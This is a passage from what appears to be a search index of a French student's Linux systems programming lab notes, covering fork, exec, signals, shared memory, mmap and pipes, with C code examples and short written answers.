editor.\n */\n\n/* \n * File:   main.c\n * Author: aurelio\n *\n */\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;time.h&gt;\n\n/*\n * \n */\nint main(int argc, char** argv) {\n    char oc;\n    int repet = -1;\n\n    while ((oc = getopt(argc, argv, \"in\")) != -1) {\n        switch (oc) {\n            case 'a':\n                printf(\"boummm \\n\");\n                break;\n            case 'i':\n                printf(\"nombre de valeur : \");\n                scanf(\"%i\", &amp;repet);\n                break;\n            case 'n':\n                repet = atoi(optarg); //convertir en nombr en XXX (le role de atoi)\n                break;\n            case '?':\n            default:\n                break;\n        }\n    }\n\n    while (repet-- != 0 ) {\n        printf(\"%d\\n\", rand()%1000);\n        usleep(500000);\n    }\n    return (EXIT_SUCCESS);\n}\n</code></pre></p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#8-creation-dun-processus-en-c","title":"8. Cr\u00e9ation d'un processus en C","text":""},{"location":"cours-TP/C_Systems/tpa/tpa/#aquel-interet-a-un-processus-de-se-forke-dans-quel-td-precedent-un-processus-est-il-forke-pour-quelles-raisons","title":"a)Quel int\u00e9r\u00eat a un processus de se 'fork\u00e9' ? Dans quel TD pr\u00e9c\u00e9dent un processus est-il \u00ab fork\u00e9 \u00bb ? Pour qu'elles raisons ?","text":"<p>L'int\u00e9r\u00eat principal pour un processus de se \"forker\" (se cloner) est d'ex\u00e9cuter des t\u00e2ches en parall\u00e8le. Dans le TD Docker.</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#b-quelles-sont-les-particularites-dun-processus-forke","title":"b) Quelles sont les particularit\u00e9s d'un processus \u00ab fork\u00e9 \u00bb","text":"<p>Le processus fork\u00e9 est un clone presque parfait :     Certaines choses changent :          - Le PID         - Une m\u00e9moire s\u00e9par\u00e9e  Il h\u00e9rite de son clone p\u00e8re  le fork() renvoie 0 si il est fils et si il est p\u00e8re renvoie un nombre &gt; a 0</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#c-quelle-difference-existe-il-entre-un-processus-forke-et-un-thread","title":"c) Quelle diff\u00e9rence existe il entre un processus \u00ab fork\u00e9 \u00bb et un thread ?","text":"<p>La principale diff\u00e9rence est la gestion de m\u00e9moire.</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#dquelle-est-lune-des-limites-de-lutilisation-de-fork","title":"d)Quelle est l'une des limites de l'utilisation de fork() ?","text":"<p>La compl\u00e9xit\u00e9 de communication, il doivent communiquer gr\u00e2ce a des IPC : Communication Inter-processus qui sont lourds</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#e-quels-problemes-peuvent-poser-les-threads","title":"e) Quels probl\u00e8mes peuvent poser les threads ?","text":"<p>Si deux threads modifie la m\u00eame variable, le r\u00e9sultat sera impr\u00e9visible. Il faudrait donc v\u00e9rouiller les ressoruces a chaque passage d'un thread afin que deux threads ne puissent modifier la meme variable</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#9-utilisation-de-fork-wait-waitpid-sleep","title":"9. Utilisation de fork, wait, waitpid, sleep","text":""},{"location":"cours-TP/C_Systems/tpa/tpa/#aque-donnent-les-commandes-ps-et-pstree-pendant-lexecution-du-programme","title":"a)Que donnent les commandes ps et pstree pendant l\u2019ex\u00e9cution du programme ?","text":"<p>pstree :  </p> <p>ps : </p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#bobservez-letat-des-processusque-se-passe-t-il-corriger-le-code-du-processus-pere-pour-que-les-processus-se-terminent-correctement","title":"b)Observez l\u2019\u00e9tat des processus.Que se passe-t-il ? Corriger le code du processus p\u00e8re pour que les processus se terminent correctement.","text":"<p>Je rajoute +1 a i pour dire que le fils est le num\u00e9ro i+1   Recuperation du PID pere pour que le fils puisse l'identifier avec <code>getpid()</code></p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#cmodifiez-le-code-precedent-pour-que-les-fils-affichent-je-suis-le-fils-numero-n-la-valeur-de-n-est-le-numero-dordre-de-creation-du-fils-le-fils-doit-aussi-affiche-sont-pid-ainsi-que-le-pid-du-pere","title":"c)Modifiez le code pr\u00e9c\u00e9dent pour que les fils affichent \"Je suis le fils numero n \". La valeur de n est le num\u00e9ro d'ordre de cr\u00e9ation du fils. Le fils doit aussi affich\u00e9 sont PID, ainsi que le PID du p\u00e8re.","text":"<p> J'ai fais un affichage plus lisible dans les printf J'ai lanc\u00e9 deux fils et on voit ici que l'ordre de cr\u00e9ation est FILS 2 puis FILS 1, fils 1 commence par dire je suis fils 1 etc.. 'voir capture'</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#dmodifiez-le-programme-precedent-pour-quil-y-ait-toujours-le-meme-nombre-denfants-en-fonction","title":"d)Modifiez le programme pr\u00e9c\u00e9dent pour qu'il y ait toujours le m\u00eame nombre d'enfants en fonction.","text":"<p>apr\u00e8s le fork on wait()  on lance le pool initial,  d\u00e8s qu'un fils est termin\u00e9, le p\u00e8re en fork un nouveau</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#e-creez-une-variable-globale-chaque-fils-devra-afficher-la-variable-globale-avant-de-la-modifier-de-facon-aleatoire-et-afficher-la-nouvelle-valeur-juste-avant-de-terminer-son-activite-quobservez-vous-est-ce-coherent-avec-les-questions-de-la-partie-6","title":"e) Cr\u00e9ez une variable globale. Chaque fils devra afficher la variable globale avant de la modifier de fa\u00e7on al\u00e9atoire et afficher la nouvelle valeur, juste avant de terminer son activit\u00e9. Qu'observez-vous ? Est-ce coh\u00e9rent avec les questions de la partie 6 ?","text":"<p> On observe que :  tous les fils voient la meme adresse m\u00e9moire, tous les fils voient la valeur initiale, ils modifient la variable en valeur diff\u00e9rente et \u00e0 la fin le p\u00e8re \u00e0 bien la variable initiale.</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#10-execution-de-routine-de-terminaison","title":"10. Ex\u00e9cution de routine de terminaison","text":""},{"location":"cours-TP/C_Systems/tpa/tpa/#a-modifiez-le-programme-precedent-pour-que-les-processus-affichent-bye-en-utilisant-une-fonction-de-terminaison","title":"a) Modifiez le programme pr\u00e9c\u00e9dent pour que les processus affichent \"Bye\" en utilisant une fonction de terminaison.","text":"<p>Les fils disent \"bye\" lorsqu'ils utilise une fonction de terminaison. Explication :  Cr\u00e9er une fonction \"dire_aurevoir()\" Permettant de dire bye et afficher le PID. Appel\u00e9 cette fonction \u00e0 chaque exit dans la boucle  On initialise l'appelle de la fonction en haut du main atexit(dire_aurevoir)</p>"},{"location":"cours-TP/C_Systems/tpa/tpa/#11-execution-du-programme-externe-avec-exec","title":"11. Execution du programme externe avec exec","text":""},{"location":"cours-TP/C_Systems/tpa/tpa/#a-modifiez-le-programme-precedent-pour-que-chaque-processus-fils-lance-lexecution-du-programme-randomgenerator-avec-un-nombre-de-valeur-comprise-entre-10-et-20-ie-randomgenerator-n-15","title":"a) Modifiez le programme pr\u00e9c\u00e9dent pour que chaque processus fils lance l\u2019ex\u00e9cution du programme randomgenerator avec un nombre de valeur comprise entre 10 et 20. (i.e. randomgenerator -n 15 )","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt; \n#include &lt;sys/wait.h&gt;\n#include &lt;time.h&gt;\n\nint main(int argc, char** argv) {\n    int n;\n    printf(\"Combien de fils lanceurs (max 9) ? \");\n    scanf(\"%d\", &amp;n);\n    if (n &lt;= 0 || n &gt;= 10) return 1;\n\n    // Initialiser le g\u00e9n\u00e9rateur de nombres al\u00e9atoires pour le p\u00e8re\n    srand(time(NULL)); \n\n    printf(\"P\u00e8re (PID %d) : Lancement de %d fils...\\n\", getpid(), n);\n\n    for (int i = 0; i &lt; n; i++) {\n        pid_t pid = fork();\n\n        if (pid &lt; 0) {\n            perror(\"fork\"); exit(1);\n        } else if (pid == 0) {\n            // Code du FILS\n\n            int n_val = (rand() % 11) + 10; //G\u00e9n\u00e9rer un nombre al\u00e9atoire entre 10 et 20\n\n            // convertir ce nombre en cha\u00eene de caract\u00e8res\n            char n_str[4]; // Assez pour \"20\" + NUL\n            sprintf(n_str, \"%d\", n_val);\n\n            printf(\"[Fils %d] (PID %d) : Je lance './main -n %s'\\n\", \n                   i+1, getpid(), n_str);\n\n            // rempalcer ce processus fils par le programme \"./main\"\n            execlp(\"./main\", \"main\", \"-n\", n_str, NULL); //On lui passe \"-n\" et le nombre (n_str) comme arguments\n\n            // si execlp() marche , le code s'arr\u00eate\n            // sinon, 'il y a eu une erreur.\n            perror(\"execlp a \u00e9chou\u00e9\");\n            exit(1); \n        }\n    }\n\n    // --- Code du P\u00c8RE ---\n    // le pere  attend que ses 'n' enfants se terminent\n    printf(\"P\u00e8re (PID %d) : J'attends que les %d fils aient termin\u00e9.\\n\", getpid(), n);\n\n    for (int i = 0; i &lt; n; i++) {\n        wait(NULL); \n    }\n\n    printf(\"P\u00e8re : Tous les './main' sont termin\u00e9s.\\n\");\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/C_Systems/tpb/tpb/","title":"2.3 Signaux","text":""},{"location":"cours-TP/C_Systems/tpb/tpb/#23a-la-fonction-sigaction-permet-de-definir-un-handler-pour-un-signal-en-respectant-les-points-particuliers-mis-en-exergue-dans-les-paragraphes-precedents-vous-devez-ecrire-un-programme-qui-se-forke-en-5-enfants-toutes-les-secondes-sur-une-duree-de-30-secondes-le-processus-pere-doit-envoyer-un-signal-sigusr1-a-lun-des-enfants-le-processus-recevant-le-signal-sigusr1-doit-afficher-le-message-hello-from-pid-pid-etant-le-pid-du-processus-enfant-une-fois-les-30-secondes-ecoulees-le-processus-parent-doit-envoyer-un-signal-sigint-aux-5-processus-enfants-attention-aux-processus-zombie","title":"2.3a )La fonction sigaction permet de d\u00e9finir un handler pour un signal. En respectant les points particuliers mis en exergue dans les paragraphes pr\u00e9c\u00e9dents vous devez :  \u00c9crire un programme qui se \u00ab forke \u00bb en 5 enfants. /  Toutes les secondes sur une dur\u00e9e de 30 secondes, le processus p\u00e8re doit envoyer un signal SIGUSR1 a l\u2019un des enfants. / Le processus recevant le signal SIGUSR1 doit afficher le message \u00ab Hello from PID \u00bb, PID \u00e9tant le pid du processus enfant. / Une fois les 30 secondes \u00e9coul\u00e9es, le processus parent doit envoyer un signal SIGINT aux 5 processus enfants (Attention aux processus Zombie)","text":"<p>Ce  code repond \u00e0 tous les crit\u00e8re demand\u00e9 par l'\u00e9nonc\u00e9. Le r\u00e9sultat plus bas : <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;      // Pour fork(), getpid(), sleep(), pause()\n#include &lt;signal.h&gt;      // Pour sigaction(), kill(), sigemptyset()\n#include &lt;sys/wait.h&gt;    // Pour wait()\n#include &lt;time.h&gt;        // Pour time() et srand()\n\n#define NUM_CHILDREN 5 // On d\u00e9finit le nombre de fils a 5 comme le dit l'\u00e9nonc\u00e9\n\n\n//FLAG Gestionaire de signal\n\n//volatile signifie que la variable peut \u00eatre modifi\u00e9s par des signaux\n// sig_atomic_t est un type entier garanti d'etre modifi\u00e9 atomiquement \nvolatile sig_atomic_t sigusr1_received = 0; // Variable pour indiquer la r\u00e9ception du signal\n\n\n\n// Gestionaire de signal pour SIGUSR1\nvoid handle_sigusr1(int sig) {\n    (void)sig; // Correction : Pour enlever le warning \"unused parameter\"\n    sigusr1_received = 1; // On met a jour la variable pour indiquer la r\u00e9ception du signal\n}\n\n// Fonction pour le processus fils\nvoid child_logic(void){\n    //configuration du gest de signal avec sigaction()\n    struct sigaction sa; // Correction : La variable est renomm\u00e9e \"sa\"\n    sa.sa_handler = handle_sigusr1; // On assigne le gestionnaire de signal\n    sigemptyset(&amp;sa.sa_mask); // On initialise le masque de signal a vide\n    sa.sa_flags = 0; // Pas de drapeaux sp\u00e9ciaux\n\n    //on lie le gestionnaire de signal SIGUSR1\n    // Correction : On appelle la FONCTION sigaction() avec la VARIABLE sa\n    if (sigaction(SIGUSR1, &amp;sa, NULL) == -1) { \n        perror(\"sigaction\");\n        exit(1);\n}\n//Le signal SIGINT gardera son comportement par d\u00e9faut : terminer le processus \n\n\n//maintenant la boucle principale du fils : \n    while (1) {\n        pause(); //met en pause le processus jusqu'\u00e0 la r\u00e9ception d'un signal\n\n        //on va v\u00e9rifi\u00e9 si c'est SIGUSR1 qui a \u00e9t\u00e9 re\u00e7u\n        if (sigusr1_received) {\n            sigusr1_received = 0; // on r\u00e9initialise la variable\n            printf(\"Le fils%d a re\u00e7u le SIGUSR1\\n\", getpid());\n\n        }\n    }\n    //le fils ne sortira jamais de cette boucle\n    //il est pr\u00e9vu qu'il soit tu\u00e9 par le p\u00e8re\n}\n\nvoid parent_logic(pid_t child_pids[]){ \n    //on initilise le g\u00e9n\u00e9rateur de nombre al\u00e9atoire\n    srand(time(NULL));\n    printf(\"P\u00e8re PID : %d\\n\", getpid());\n    printf(\"Lancement de %d enfant \\n\", NUM_CHILDREN);\n\n    //on sleep 1 seconde pour laisser le temps aux fils de s'initialiser\n    sleep(1);\n\n    printf(\"P\u00e8re PID : %d\\n\", getpid());\n    printf(\"Envoi des signaux SIGUSR1 aux enfants\\n\");\n\n\n    //on entre dans un boucle de 30 secondes on envoie des signaux SIGUSR1 aux fils\n    for (int i = 0; i &lt; 30; i++) {\n        //on choisit un fils au hasard\n        int random_index = rand() % NUM_CHILDREN;\n        pid_t child_pid = child_pids[random_index];\n        // Envoie le signal SIGUSR1 \u00e0 l'enfant cibl\u00e9\n        kill(child_pid, SIGUSR1);\n\n        //on attend 1 seconde avant d'envoyer le prochain signal\n        sleep(1);\n    }\n    //Apr\u00e8s 30 secondes on termine les fils\n    printf(\"P\u00e8re PID : %d\\n\", getpid());\n    printf(\"Terminaison des enfants\\n\");\n    for (int i = 0; i &lt; NUM_CHILDREN ; i++) {\n        kill(child_pids[i], SIGINT); //on envoie le signal SIGINT pour terminer les fils\n    }\n\n\n\n    //maitenant on va \u00e9viter les processus zombies \n    printf(\"P\u00e8re PID : %d\\n\", getpid());\n    printf(\"Attente de la terminaison des enfants\\n\");\n    for (int i = 0; i &lt; NUM_CHILDREN ; i++) {\n        int status;\n        wait(&amp;status); //on attend la terminaison de chaque fils\n    }\n    printf(\"Tous les enfants ont \u00e9t\u00e9 termin\u00e9s.\\n\");\n\n}\n\nint main(void){\n    pid_t child_pids[NUM_CHILDREN];\n\n    for (int i = 0; i &lt; NUM_CHILDREN; i++) { \n\n        pid_t pid = fork();\n\n        if (pid &lt; 0){\n            perror(\"fork\");\n            exit(1);\n        }\n        if (pid == 0 ){\n            child_logic();\n            exit(0); //le fils termine son ex\u00e9cution ici\n\n        }else {\n            child_pids[i] = pid; //le p\u00e8re stocke le PID du fils\n        }\n\n    }\n    parent_logic(child_pids);\n    return 0;\n}\n</code></pre></p> <p></p> <p>Le p\u00e8re annonce son PID  et lance les 5 enfants.</p> <p>Gestion des signaux (SIGUSR1) : On voit les messages \"Le fils... a re\u00e7u le SIGUSR1\". Il y a bien 30 messages, un par seconde.</p> <p>Caract\u00e8re al\u00e9atoire : La suite de fils prouve que votre rand() % NUM_CHILDREN fonctionne bien.</p> <p>Terminaison propre (SIGINT) : Apr\u00e8s les 30 signaux, le p\u00e8re annonce la \"Terminaison des enfants\".</p> <p>Gestion des Zombies (wait) : Le p\u00e8re annonce \"Attente de la terminaison\" et \"Tous les enfants ont \u00e9t\u00e9 termin\u00e9s.\"</p>"},{"location":"cours-TP/C_Systems/tpb/tpb/#23bil-existe-une-fonction-signal-qui-permet-de-faire-presque-la-meme-chose-que-sigaction-pourtant-son-utilisation-est-fortement-deconseillee-pourquoi","title":"2.3b)Il existe une fonction signal qui permet de faire presque la m\u00eame chose que sigaction. Pourtant son utilisation est fortement d\u00e9conseill\u00e9e. Pourquoi ?","text":"<p>Oui, il existe la fonction <code>signal()</code> qui a plusieurs defauts :      - l'absence de masque pour les signaux : alors que sigaction permet de sp\u00e9cifier en sa_mask, signal() lui n'offre pas ce contre. Le sa_mask permet de bloquer automatiquement un ensemble de signaux.     - signal ne permet pas de sp\u00e9cifier des FLAGS permettant de d'interrompre , start des appels.</p>"},{"location":"cours-TP/C_Systems/tpb/tpb/#3-memoire-partagee","title":"3. M\u00e9moire Partag\u00e9e","text":""},{"location":"cours-TP/C_Systems/tpb/tpb/#3a-en-vous-basant-le-fichier-td5-shared_memoryc-et-en-reutilisant-le-code-du-td-sur-les-processus-ou-celui-de-lexercice-precedent-vous-devez","title":"3.A) En vous basant le fichier TD5-shared_memory.c et en r\u00e9utilisant le code du TD sur les processus (ou celui de l\u2019exercice pr\u00e9c\u00e9dent) vous devez :","text":""},{"location":"cours-TP/C_Systems/tpb/tpb/#ecrire-un-programme-qui-se-forke-un-seul-processus-fils","title":"Ecrire un programme qui se \u00ab forke \u00bb (un seul processus fils)","text":""},{"location":"cours-TP/C_Systems/tpb/tpb/#le-processus-parent-devra-afficher-un-nombre-aleatoire-compris-entre-0-et-100-et-lecrire-dans-la-memoire-partagee","title":"Le processus parent devra afficher un nombre al\u00e9atoire compris entre 0 et 100 et l\u2019\u00e9crire dans la m\u00e9moire partag\u00e9e.","text":""},{"location":"cours-TP/C_Systems/tpb/tpb/#apres-quoi-le-processus-parent-devra-envoyer-un-signal-sigusr1-au-processus-fils-pour-lui-signaler-que-des-donnees-sont-disponibles-dans-la-memoire-partagee","title":"Apr\u00e8s-quoi le processus parent devra envoyer un signal SIGUSR1 au processus fils pour lui signaler que des donn\u00e9es sont disponibles dans la m\u00e9moire partag\u00e9e.","text":""},{"location":"cours-TP/C_Systems/tpb/tpb/#le-processus-fils-devra-lire-les-donnees-disponibles-et-afficher-son-pid-en-meme-temps-que-les-donnees-lues","title":"Le processus fils devra lire les donn\u00e9es disponibles et afficher son pid en m\u00eame temps que les donn\u00e9es lues.","text":""},{"location":"cours-TP/C_Systems/tpb/tpb/#apres-lenvoi-de-5-valeurs-aleatoires-au-processus-fils-le-processus-parent-mettra-fin-au-processus-fils-et-se-terminera","title":"Apr\u00e8s l\u2019envoi de 5 valeurs al\u00e9atoires au processus fils, le processus parent mettra fin au processus fils, et se terminera.","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;sys/shm.h&gt;\n#include &lt;sys/wait.h&gt;\n#include &lt;time.h&gt;\n\nvolatile sig_atomic_t data_ready = 0;\n\nvoid handler_child(int sig) {\n    data_ready = 1;\n}\nint main() {\n    int shmid;\n    int *shared_mem;\n    pid_t pid;\n    //cr\u00e9ation  segment de m\u00e9moire partag\u00e9e\n    shmid = shmget(IPC_PRIVATE, sizeof(int), IPC_CREAT | 0666);\n    if (shmid &lt; 0) { perror(\"shmget\"); exit(1); }\n\n    // attache au segment\n    shared_mem = (int *)shmat(shmid, NULL, 0);\n    if (shared_mem == (int *)-1) { perror(\"shmat\"); exit(1); }\n\n    // Fork\n    pid = fork();\n\n    if (pid == 0) {\n        // FILS : \n        struct sigaction sa;\n        sa.sa_handler = handler_child;\n        sigemptyset(&amp;sa.sa_mask);\n        sa.sa_flags = 0; \n        sigaction(SIGUSR1, &amp;sa, NULL);\n\n        while(1) {\n            while(!data_ready) {\n                pause(); // wait le signal du p\u00e8re\n            }\n            data_ready = 0; // reset le  flag\n            printf(\"[FILS PID %d] Valeur lue : %d\\n\", getpid(), *shared_mem);\n        }\n    } else {\n        // PERE :\n        srand(time(NULL));\n        for (int i = 0; i &lt; 5; i++) {\n            int val = rand() % 101; // 0 \u00e0 100\n            *shared_mem = val;   \n            printf(\"[PERE] Ecriture de %d. Notification du fils.\\n\", val);\n\n            kill(pid, SIGUSR1); // signal SIGUSR1 \n            sleep(1);             \n        }\n\n        // KILL FILS\n        printf(\"[PERE] Fin. Arr\u00eat du fils.\\n\");\n        kill(pid, SIGKILL);\n        wait(NULL);\n        shmdt(shared_mem);\n        shmctl(shmid, IPC_RMID, NULL);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/C_Systems/tpb/tpb/#4-memoire-mappee","title":"4. M\u00e9moire mapp\u00e9e","text":""},{"location":"cours-TP/C_Systems/tpb/tpb/#4a-pour-mettre-en-correspondance-un-fichier-ordinaire-avec-la-memoire-dun-processus-utilisez-lappel-mmap-cette-fonction-accepte-6-parametres-donnez-le-role-de-chacun-des-parametres-avec-les-valeurs-possibles","title":"4.a )  Pour mettre en correspondance un fichier ordinaire avec la m\u00e9moire d\u2019un processus, utilisez l\u2019appel mmap. Cette fonction accepte 6 param\u00e8tres. Donnez le r\u00f4le de chacun des param\u00e8tres avec les valeurs possibles","text":"<p>addr : addresse m\u00e9moire pour le mapping length : longueur de la zone mapper prot : pour prot\u00e9ger la m\u00e9moire flags : type de mapping fd : description de fichier  offset :  d\u00e9calage dans le fichier o\u00f9 comment le mapping</p>"},{"location":"cours-TP/C_Systems/tpb/tpb/#4b-que-signifie-la-ligne-prot_read-prot_write-dans-le-fichier-readerc","title":"4.b)  Que signifie la ligne \u00ab PROT_READ | PROT_WRITE \u00bb dans le fichier reader.c","text":"<p>Cette ligne demande l'autorisation de lire et d'\u00e9crire dans la zone m\u00e9moire mapp\u00e9.</p>"},{"location":"cours-TP/C_Systems/tpb/tpb/#4ca-quoi-sert-le-drapeau-map_shared","title":"4.c)A quoi sert le drapeau MAP_SHARED ?","text":"<p>Il sert a indiquer que les modifications sont apport\u00e9es \u00e0 la m\u00e9moire. Visible par les autres processus qui ont mapp\u00e9 le m\u00eame fichier.</p>"},{"location":"cours-TP/C_Systems/tpb/tpb/#4d-utilisez-les-fichiers-readerc-et-writerc-pour-ecrire-deux-programmes-le-premier-programme-ecrira-sous-forme-binaire-le-contenu-dun-tableau-dentiers-de-5-valeurs-aleatoires-dans-la-memoire-mappee-le-second-programme-devra-lire-ces-valeurs-depuis-la-memoire-mappee-et-les-afficher","title":"4.d) Utilisez les fichiers reader.c et writer.c pour \u00e9crire deux programmes. Le premier programme \u00e9crira sous forme binaire le contenu d\u2019un tableau d\u2019entiers de 5 valeurs al\u00e9atoires dans la m\u00e9moire mapp\u00e9e. Le second programme devra lire ces valeurs depuis la m\u00e9moire mapp\u00e9e, et les afficher","text":"<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;time.h&gt;\n#include &lt;unistd.h&gt;\n\n#define NUM_VALUES 5\n#define FILE_LENGTH (NUM_VALUES * sizeof(int))\n\nint random_range(unsigned const low, unsigned const high) {\n    unsigned const range = high - low + 1;\n    return low + (int) (((double) range) * rand() / (RAND_MAX + 1.0));\n}\n\nint main(int argc, char *argv[]) {\n    if (argc &lt; 2) return 1;\n\n    srand(time(NULL));\n\n    // dimensionnement du fichier\n    int fd = open(argv[1], O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);\n    ftruncate(fd, FILE_LENGTH); \n\n    // mapping de la  m\u00e9moire\n    void *file_mem = mmap(0, FILE_LENGTH, PROT_WRITE, MAP_SHARED, fd, 0);\n    close(fd);\n\n    if (file_mem == MAP_FAILED) return 1;\n\n    // Cast vers int* et \u00e9criture binaire\n    int *array = (int*) file_mem;\n    for (int i = 0; i &lt; NUM_VALUES; i++) {\n        array[i] = random_range(-100, 100);\n        printf(\"\u00c9crit : %d\\n\", array[i]);\n    }\n\n    munmap(file_mem, FILE_LENGTH);\n    return 0;\n}\n</code></pre> <p><pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;sys/mman.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;unistd.h&gt;\n\n#define NUM_VALUES 5\n#define FILE_LENGTH (NUM_VALUES * sizeof(int))\n\nint main(int argc, char *argv[]) {\n    if (argc &lt; 2) return 1;\n\n    int fd = open(argv[1], O_RDWR, S_IRUSR | S_IWUSR);\n    if (fd == -1) return 1;\n\n    // Mapping m\u00e9moire\n    void *file_mem = mmap(0, FILE_LENGTH, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);\n    close(fd);\n\n    if (file_mem == MAP_FAILED) return 1;\n\n    // Cast vers int* et lecture binaire\n    int *array = (int*) file_mem;\n    for (int i = 0; i &lt; NUM_VALUES; i++) {\n        printf(\"Lu : %d\\n\", array[i]);\n    }\n\n    munmap(file_mem, FILE_LENGTH);\n    return 0;\n}\n</code></pre> </p>"},{"location":"cours-TP/C_Systems/tpc/tpc/","title":"TPC-Communication inter-processus sous linux - Partie II","text":""},{"location":"cours-TP/C_Systems/tpc/tpc/#2-tubes-aka-pipes","title":"2. Tubes (aka \u00ab pipes \u00bb)","text":""},{"location":"cours-TP/C_Systems/tpc/tpc/#2a-vous-devez-ecrire-un-programme-qui-se-forke","title":"2a) Vous devez \u00e9crire un programme qui se \u00ab forke \u00bb :","text":""},{"location":"cours-TP/C_Systems/tpc/tpc/#le-processus-parent-devra-envoyer-n-valeurs-aleatoires-comprises-entre-0-et-9-au-processus-fils-a-travers-un-tube-la-valeur-de-n-est-comprise-entre-5-et-20","title":"Le processus parent devra envoyer \u00ab n \u00bb valeurs al\u00e9atoires comprises entre 0 et 9 au processus fils a travers un tube. La valeur de \u00ab n \u00bb est comprise entre 5 et 20.","text":""},{"location":"cours-TP/C_Systems/tpc/tpc/#le-processus-fils-devra-lire-les-toutes-les-valeurs-qui-lui-sont-transmises-calculer-leur-somme-et-quitter","title":"Le processus fils devra lire les toutes les valeurs qui lui sont transmises, calculer leur somme et quitter.","text":""},{"location":"cours-TP/C_Systems/tpc/tpc/#le-processus-parent-doit-se-terminer-lorsque-le-processus-fils-a-fini-sa-tache","title":"Le processus parent doit se terminer lorsque le processus fils a fini sa tache.","text":"<p>Programme somme des valeur aleatoire : </p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;time.h&gt;\n#include &lt;sys/wait.h&gt;\n\nint main() {\n    int pipe_fds[2];\n    pid_t pid;\n    int n, val, sum = 0;\n    // Cr\u00e9ation du tube\n    if (pipe(pipe_fds) == -1) {\n        perror(\"pipe\");\n        return 1;\n    }\n    // Cr\u00e9ation du processus\n    pid = fork();\n\n    if (pid == -1) {\n        perror(\"fork\");\n        return 1;\n    }\n\n    if (pid == 0) { \n        //FILS\n        close(pipe_fds[1]); \n\n        printf(\"FILS En attente de donn\u00e9es...\\n\");\n\n        //  tant que le tube est ouvert \n        while (read(pipe_fds[0], &amp;val, sizeof(int)) &gt; 0) {\n            printf(\"FILS Re\u00e7u : %d\\n\", val);\n            sum += val;\n        }\n\n        printf(\"FILS Somme totale : %d\\n\", sum);\n        close(pipe_fds[0]);\n        exit(0);\n\n    } else { \n        // PERE \n        close(pipe_fds[0]); \n\n        srand(time(NULL));\n        // n entre 5 et 20\n        n = 5 + (rand() % 16); \n\n        printf(\"PERE Envoi de %d valeurs...\\n\", n);\n\n        for (int i = 0; i &lt; n; i++) {\n            val = rand() % 10; // Valeur entre 0 et 9\n            write(pipe_fds[1], &amp;val, sizeof(int));\n        }\n\n        // Fermer le tube envoie EOF au fils\n        close(pipe_fds[1]); \n\n        // Attendre la fin du fils\n        wait(NULL);\n        printf(\"PERE Le fils a termin\u00e9. Fin du programme.\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"cours-TP/C_Systems/tpc/tpc/#2b-quelle-est-le-roleinteret-de-la-commande-dup2","title":"2b) Quelle est le r\u00f4le/int\u00e9r\u00eat de la commande dup2?","text":"<p>L'int\u00e9r\u00eat de la commande dup2 est de duppliquer un descripteur de fichier. Elle permet la redirection des entr\u00e9s / sorties standards.</p>"},{"location":"cours-TP/C_Systems/tpc/tpc/#2ca-quoi-servent-les-commandes-popen-et-pclose","title":"2c)A quoi servent les commandes popen et pclose?","text":"<p>popen : cr\u00e9e un pipe, renvoie un pointeur de fichier permettant de lire la sortie de la commande comme si c'\u00e9tait un fichier classique. </p>"},{"location":"cours-TP/C_Systems/tpc/tpc/#3-tubes-nommes-fifo-aka-named-pipe","title":"3. Tubes nomm\u00e9s (FIFO, aka \u00ab named pipe \u00bb)","text":""},{"location":"cours-TP/C_Systems/tpc/tpc/#3a-vous-devez-ecrire-deux-programme-sans-necessairement-utiliser-fork","title":"3a) Vous devez \u00e9crire deux programme sans n\u00e9cessairement utiliser fork","text":""},{"location":"cours-TP/C_Systems/tpc/tpc/#le-premier-programme-appele-send_rand-qui-ecrit-n-valeurs-aleatoires-dans-un-tube-nomme-ce-programme-prendra-en-argument-le-nom-du-tube-et-loption-n-qui-sera-suivi-du-nombre-de-valeurs-aleatoires-a-envoyer-dans-le-tube-ce-programme-devra-creer-le-tube-dans-le-repertoire-tmp-si-celui-ci-nexiste-pas-deja-exemple-de-syntaxe-send_rand-mypipe-n-30-qui-enverra-30-valeurs-aleatoires-dans-le-tube-nomme-mypipe","title":"Le premier programme appel\u00e9 send_rand qui \u00e9crit \u00ab n \u00bb valeurs al\u00e9atoires dans un tube nomm\u00e9. Ce programme prendra en argument le nom du tube, et l'option -n qui sera suivi du nombre de valeurs al\u00e9atoires \u00e0 envoyer dans le tube. Ce programme devra cr\u00e9er le tube dans le r\u00e9pertoire /tmp si celui-ci n'existe pas d\u00e9j\u00e0. Exemple de syntaxe : send_rand mypipe -n 30 qui enverra 30 valeurs al\u00e9atoires dans le tube nomm\u00e9 \u00ab mypipe \u00bb","text":""},{"location":"cours-TP/C_Systems/tpc/tpc/#le-second-programme-appele-get_rand-lira-toutes-les-valeurs-presentes-dans-le-tube-et-affichera-la-moyenne-des-valeurs-avant-de-quitter","title":"Le second programme appel\u00e9 get_rand 